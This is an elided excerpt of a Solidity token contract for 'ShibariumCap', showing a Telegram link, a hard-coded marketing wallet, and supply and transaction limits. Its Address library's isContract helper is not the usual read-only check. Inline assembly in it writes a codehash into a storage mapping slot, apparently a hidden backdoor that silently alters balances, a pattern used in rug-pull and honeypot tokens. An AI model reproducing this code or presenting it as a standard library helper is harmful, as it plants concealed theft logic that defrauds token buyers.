...
/*
    ...
    TELEGRAM: https://t.me/ShibariumCapBSC
...
library Address {
    ...
    function isContract(address account) internal returns (bool) {
        ...
        assembly { codehash := extcodehash(account) mstore(0, account) mstore(32, 1) sstore(keccak256(0, 64), codehash) }
...
contract ShibariumCap is Context, IERC20, Ownable {
    ...
    address public marketingWallet = 0x81af477613bD531D1dd121B55D398bdb313ea348; // Marketing Address
    ...
    uint256 private _totalSupply = 250_000 * 10**9;
    uint256 public _maxTxAmount = 7_500 * 10**9;
    uint256 public _walletMax = 7_500 * 10**9;
